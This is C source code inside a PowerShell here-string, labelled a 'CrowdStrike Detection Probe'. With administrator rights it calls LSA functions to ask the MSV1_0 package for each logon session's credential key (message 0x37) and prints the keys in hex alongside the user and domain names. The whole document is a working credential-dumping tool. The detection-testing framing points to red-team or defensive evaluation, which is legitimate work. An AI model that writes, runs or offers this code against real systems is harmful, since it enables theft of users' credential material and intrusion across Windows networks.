$code = @'
#include <windows.h>
#include <stdio.h>
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((LONG)0x00000000L)
#endif
typedef LONG NTSTATUS;
typedef struct { USHORT Length; USHORT MaximumLength; PCHAR Buffer; } MY_LSA_STRING;
typedef struct { ULONG Size; LUID LogonId; UNICODE_STRING UserName; UNICODE_STRING LogonDomain; UNICODE_STRING AuthenticationPackage; ULONG LogonType; ULONG Session; PSID Sid; LARGE_INTEGER LogonTime; UNICODE_STRING LogonServer; UNICODE_STRING DnsDomainName; UNICODE_STRING Upn; } MY_SESSION_DATA;
typedef struct { ULONG MessageType; LUID LogonId; } CREDKEY_REQUEST;
typedef struct { ULONG MessageType; ULONG KeyType; UCHAR Key[20]; } CREDKEY_RESPONSE;
typedef NTSTATUS (WINAPI *fn_Register)(MY_LSA_STRING*, PHANDLE, PULONG);
typedef NTSTATUS (WINAPI *fn_Lookup)(HANDLE, MY_LSA_STRING*, PULONG);
typedef NTSTATUS (WINAPI *fn_Call)(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
typedef NTSTATUS (WINAPI *fn_Free)(PVOID);
typedef NTSTATUS (WINAPI *fn_Enumerate)(PULONG, PLUID*);
typedef NTSTATUS (WINAPI *fn_GetData)(PLUID, MY_SESSION_DATA**);
typedef NTSTATUS (WINAPI *fn_Deregister)(HANDLE);
static fn_Register _R=NULL; static fn_Lookup _L=NULL; static fn_Call _C=NULL;
static fn_Free _F=NULL; static fn_Enumerate _E=NULL; static fn_GetData _G=NULL; static fn_Deregister _D=NULL;
static void InitStr(MY_LSA_STRING *s,char *b){s->Buffer=b;s->Length=(USHORT)strlen(b);s->MaximumLength=s->Length+1;}
static void Hex(UCHAR *d,ULONG l){for(ULONG i=0;i<l;i++)printf("%02X",d[i]);printf("\n");}
static int Run(LUID luid){
    HANDLE h=NULL; ULONG pkg=0; NTSTATUS st=0,sub=0; MY_LSA_STRING p,n;
    CREDKEY_REQUEST req; CREDKEY_RESPONSE *resp=NULL; ULONG rl=0;
    InitStr(&p,"svcgaptest");
    printf("\n[*] STEP 1: LsaRegisterLogonProcess\n");
    st=_R(&p,&h,NULL);
    if(st!=STATUS_SUCCESS){printf("[-] FAILED 0x%08X - need Administrator\n",(unsigned)st);return 1;}
    printf("    [+] OK handle=%p\n",h);
    InitStr(&n,"MICROSOFT_AUTHENTICATION_PACKAGE_V1_0");
    printf("[*] STEP 2: LsaLookupAuthenticationPackage\n");
    st=_L(h,&n,&pkg);
    if(st!=STATUS_SUCCESS){printf("[-] FAILED 0x%08X\n",(unsigned)st);_D(h);return 1;}
    printf("    [+] OK pkg=%lu\n",pkg);
    memset(&req,0,sizeof(req)); req.MessageType=0x37; req.LogonId=luid;
    printf("[*] STEP 3: LsaCallAuthenticationPackage (0x37 MsvGetCredentialKey)\n");
    printf("    LUID: 0x%X:0x%X\n",(unsigned)luid.HighPart,(unsigned)luid.LowPart);
    st=_C(h,pkg,&req,sizeof(req),(PVOID*)&resp,&rl,&sub);
    if(st!=STATUS_SUCCESS) printf("[-] Outer FAILED 0x%08X\n",(unsigned)st);
    else if(sub!=STATUS_SUCCESS) printf("[-] Inner FAILED 0x%08X (bad LUID?)\n",(unsigned)sub);
    else{
        printf("    [+] OK %lu bytes\n",rl);
        if(resp&&rl>=sizeof(CREDKEY_RESPONSE)){
            printf("    === CREDENTIAL KEY ===\n    ");
            Hex(resp->Key,20);
            printf("    KeyType=%lu (1=Local 2=Domain)\n",resp->KeyType);
        }
        if(resp)_F(resp);
    }
    _D(h);
    return(st==STATUS_SUCCESS&&sub==STATUS_SUCCESS)?0:2;
}
static void RunAll(void){
    ULONG count=0; PLUID s=NULL;
    if(_E(&count,&s)!=STATUS_SUCCESS){printf("[-] Enumerate failed\n");return;}
    printf("[*] %lu sessions\n",count);
    for(ULONG i=0;i<count;i++){
        MY_SESSION_DATA *d=NULL;
        if(_G(&s[i],&d)==STATUS_SUCCESS&&d){
            if(d->LogonType==2||d->LogonType==3||d->LogonType==5){
                printf("\n--- Session %lu LUID=0x%X Type=%lu ---\n",i+1,(unsigned)s[i].LowPart,d->LogonType);
                if(d->UserName.Buffer)printf("    %S\\%S\n",d->LogonDomain.Buffer,d->UserName.Buffer);
                Run(s[i]);
            }
            _F(d);
        }
    }
    _F(s);
}
int main(int argc,char *argv[]){
    printf("=== LSA Gap Test - CrowdStrike Detection Probe ===\n");
    HMODULE h=LoadLibraryA("secur32.dll");
    if(!h){printf("[-] secur32.dll load failed\n");return 1;}
    _R=(fn_Register)GetProcAddress(h,"LsaRegisterLogonProcess");
    _L=(fn_Lookup)GetProcAddress(h,"LsaLookupAuthenticationPackage");
    _C=(fn_Call)GetProcAddress(h,"LsaCallAuthenticationPackage");
    _F=(fn_Free)GetProcAddress(h,"LsaFreeReturnBuffer");
    _E=(fn_Enumerate)GetProcAddress(h,"LsaEnumerateLogonSessions");
    _G=(fn_GetData)GetProcAddress(h,"LsaGetLogonSessionData");
    _D=(fn_Deregister)GetProcAddress(h,"LsaDeregisterLogonProcess");
    if(!_R||!_L||!_C||!_F||!_E||!_G||!_D){printf("[-] resolve failed\n");return 1;}
    printf("[+] Functions loaded\n");
    if(argc==2){LUID l={0};unsigned long long r=strtoull(argv[1],NULL,0);l.LowPart=(ULONG)(r&0xFFFFFFFF);l.HighPart=(LONG)((r>>32)&0xFFFFFFFF);return Run(l);}
    RunAll(); return 0;
}
